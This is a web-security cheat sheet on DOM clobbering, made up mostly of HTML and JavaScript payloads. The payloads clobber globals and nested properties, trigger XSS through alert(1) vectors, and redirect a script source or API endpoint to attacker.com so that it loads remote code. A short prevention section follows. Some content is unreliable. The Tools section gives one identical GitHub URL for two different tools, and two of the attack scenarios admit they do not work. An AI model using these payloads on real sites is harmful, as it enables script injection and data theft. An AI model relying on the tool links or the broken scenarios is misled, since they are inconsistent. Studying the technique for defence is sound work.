# DOM Clobbering

## Description
DOM Clobbering is a technique where HTML elements can overwrite JavaScript variables and properties by using specific `id` or `name` attributes. When an element has an `id` attribute, it becomes accessible as a global variable. This can be exploited to manipulate application logic and potentially achieve XSS.

## How It Works

When HTML elements have `id` or `name` attributes, browsers create global variables:

```html
<!-- Creates window.test = <div> element -->
<div id="test"></div>

<script>
console.log(test);        // <div id="test"></div>
console.log(window.test); // <div id="test"></div>
</script>
```

## Basic Clobbering Techniques

### 1. Clobbering Global Variables

```html
<!-- Clobber 'x' variable -->
<img id="x">

<script>
// If code checks: if (x) { ... }
// x is now the img element (truthy)
console.log(x); // <img id="x">
</script>
```

### 2. Clobbering x.y Properties

Using form and input elements:
```html
<form id="x">
    <input id="y" value="clobbered">
</form>

<script>
console.log(x.y);       // <input id="y">
console.log(x.y.value); // "clobbered"
</script>
```

Using anchor tags:
```html
<a id="x" name="y" href="clobbered">

<script>
// Creates x and x.y
console.log(x);   // HTMLCollection
console.log(x.y); // <a> element
</script>
```

### 3. Clobbering x.y.z (Three Levels)

Using form with output:
```html
<form id="x">
    <output id="y">clobbered</output>
</form>

<script>
console.log(x.y.value); // "clobbered"
</script>
```

Using iframes (Chrome):
```html
<iframe name="x" srcdoc="
    <iframe name='y' srcdoc='<a id=z href=clobbered>'></iframe>
"></iframe>

<script>
// After iframes load
console.log(x.y.z); // <a> element
</script>
```

### 4. Clobbering x.y.z.w (Four Levels)

```html
<iframe name="x" srcdoc="
    <form id='y'>
        <input id='z' name='w' value='clobbered'>
    </form>
"></iframe>
```

## Exploitation Scenarios

### 1. Bypassing Security Checks

Vulnerable code:
```javascript
if (typeof config === 'undefined') {
    config = { secure: true };
}
// Use config.secure to make decisions
```

Attack:
```html
<a id="config" name="secure" href="">
<!-- config is now defined, config.secure is empty string (falsy) -->
```

### 2. Clobbering Script Sources

Vulnerable code:
```javascript
let script = document.createElement('script');
script.src = window.cdnHost + '/app.js';
document.body.appendChild(script);
```

Attack:
```html
<a id="cdnHost" href="https://attacker.com/malicious.js">
<!-- cdnHost.toString() returns the href -->
```

### 3. Clobbering innerHTML/textContent

```html
<form id="x"><output id="y">
<img src=x onerror=alert(1)>
</output></form>

<script>
// If code uses x.y.value or x.y.textContent
element.innerHTML = x.y.value; // XSS!
</script>
```

### 4. Clobbering document Properties

```html
<!-- Clobber document.body -->
<img name="body">

<!-- Clobber document.forms -->
<form name="forms"></form>

<!-- Clobber document.getElementById -->
<!-- Not directly possible, but can interfere -->
```

## Browser-Specific Techniques

### Chrome - Clobbering forEach

```html
<form id="x">
    <input id="y">
    <input id="y">
</form>

<script>
// x.y is HTMLCollection, has forEach in Chrome
// Can clobber by adding element named 'forEach'
</script>
```

### Firefox-Specific

```html
<form id="x">
    <input name="y" value="test">
</form>

<script>
// Accessible via x.y in Firefox
</script>
```

## Advanced Payloads

### Clobbering with toString

```html
<a id="x" href="javascript:alert(1)">

<script>
// x.toString() returns href value
location = x; // Triggers JavaScript URL
</script>
```

### Clobbering with valueOf

```html
<a id="defaultAvatar" href="cid:x]onerror=alert(1)//">

<script>
// If used in: img.src = defaultAvatar
// Results in: <img src="cid:x]onerror=alert(1)//">
</script>
```

### HTMLCollection Clobbering

```html
<a id="x"></a>
<a id="x" name="y" href="clobbered"></a>

<script>
// x is HTMLCollection with both anchors
// x.y is the second anchor
console.log(x[0]); // First anchor
console.log(x.y);  // Second anchor (named 'y')
</script>
```

## Clobbering document.getElementById

```html
<!-- Using html or body element with id -->
<html id="getElementById">
<!-- or -->
<body id="getElementById">

<script>
// document.getElementById is now the element
// Breaks getElementById functionality
</script>
```

## Real-World Attack Scenarios

### Scenario 1: Configuration Override
```javascript
// Vulnerable code
var config = window.config || { apiUrl: '/api' };
fetch(config.apiUrl + '/data');
```

```html
<!-- Attack -->
<a id="config" name="apiUrl" href="https://attacker.com">
<!-- Now fetches from attacker.com -->
```

### Scenario 2: Template Injection
```javascript
// Vulnerable code
var template = defaultTemplate || '<div>{{content}}</div>';
document.body.innerHTML = template.replace('{{content}}', userContent);
```

```html
<!-- Attack -->
<img id="defaultTemplate" src="x" alt="<img src=x onerror=alert(1)>">
<!-- template becomes element, toString gives [object HTMLImageElement] -->
```

### Scenario 3: Bypassing Sanitizers
```javascript
// If sanitizer checks specific properties
if (element.nodeName !== 'SCRIPT') {
    // Allow element
}
```

```html
<!-- Clobber nodeName property (not directly possible, but illustrative) -->
```

## Tools

### DOMClobbering
```bash
# https://github.com/nickmakesstuff/domclobbering
# Browser extension for testing
```

### DOM Explorer (YesWeHack)
```bash
# https://github.com/nickmakesstuff/domclobbering
# Tool for exploring DOM clobbering vectors
```

## Detection & Prevention

### Prevention Techniques
```javascript
// Use Object.prototype.hasOwnProperty
if (Object.prototype.hasOwnProperty.call(window, 'config')) {
    // config was explicitly set
}

// Use Map instead of objects for configuration
const config = new Map();

// Freeze objects
const config = Object.freeze({ secure: true });

// Use symbols for properties
const CONFIG = Symbol('config');
window[CONFIG] = { secure: true };
```

### Content Security Policy
```http
Content-Security-Policy: default-src 'self'
```

### HTML Sanitization
```javascript
// Use DOMPurify with clobber protection
DOMPurify.sanitize(dirty, {
    SANITIZE_DOM: true
});
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://research.securitum.com/xss-in-amp4email-dom-clobbering/
